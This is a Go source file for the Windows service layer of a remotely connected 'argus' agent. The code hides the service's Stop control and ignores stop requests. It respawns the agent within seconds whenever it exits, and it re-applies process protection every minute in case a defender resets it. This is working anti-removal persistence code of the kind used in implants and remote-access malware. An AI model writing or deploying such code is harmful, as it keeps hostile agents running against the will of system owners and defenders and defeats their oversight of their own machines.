//go:build windows

package main

import (
	"log"
	"sync"
	"time"

	"argus/internal/agent"
	"golang.org/x/sys/windows/svc"
)

type argusService struct {
	server, token, id string
	mu                sync.Mutex
	current           *agent.Agent
}

// stopCurrent stops the currently running agent instance.
func (s *argusService) stopCurrent() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.current != nil {
		s.current.Stop()
	}
}

func (s *argusService) Execute(_ []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
	status <- svc.Status{State: svc.StartPending}

	protectProcess()

	// Advertise running but do NOT include svc.AcceptStop.
	// This grays out the "Stop" button in Task Manager / Services MMC and causes
	// SCM to reject `sc stop` with ERROR_INVALID_SERVICE_CONTROL at the SCM level.
	// We keep AcceptShutdown so a real Windows shutdown is not delayed.
	running := svc.Status{State: svc.Running, Accepts: svc.AcceptShutdown}
	status <- running

	quit := make(chan struct{})

	// Inner watchdog: creates a new agent instance each iteration so that
	// even if Run() returns for any reason, the agent comes back within 3 s.
	go func() {
		for {
			select {
			case <-quit:
				return
			default:
			}

			a := agent.New(s.server, s.token, s.id)
			s.mu.Lock()
			s.current = a
			s.mu.Unlock()

			a.Run()

			select {
			case <-quit:
				return
			default:
				time.Sleep(3 * time.Second)
			}
		}
	}()

	// DACL heartbeat — re-apply every 60 s in case a defender resets it.
	go func() {
		t := time.NewTicker(60 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-quit:
				return
			case <-t.C:
				if err := protectProcess(); err != nil {
					log.Printf("[!] protectProcess heartbeat: %v", err)
				}
			}
		}
	}()

	for req := range r {
		switch req.Cmd {
		case svc.Shutdown:
			// The machine is actually shutting down — exit cleanly.
			status <- svc.Status{State: svc.StopPending}
			close(quit)
			s.stopCurrent()
			return false, 0

		case svc.Stop:
			// Someone issued sc stop / clicked Stop in Task Manager.
			// Ignore it and report back that we are still running.
			log.Printf("[*] STOP request ignored")
			status <- running

		default:
			status <- running
		}
	}

	return false, 0
}

func runAsServiceIfNeeded(server, token, id string) bool {
	isService, err := svc.IsWindowsService()
	if err != nil || !isService {
		return false
	}
	svc.Run(svcName, &argusService{server: server, token: token, id: id})
	return true
}
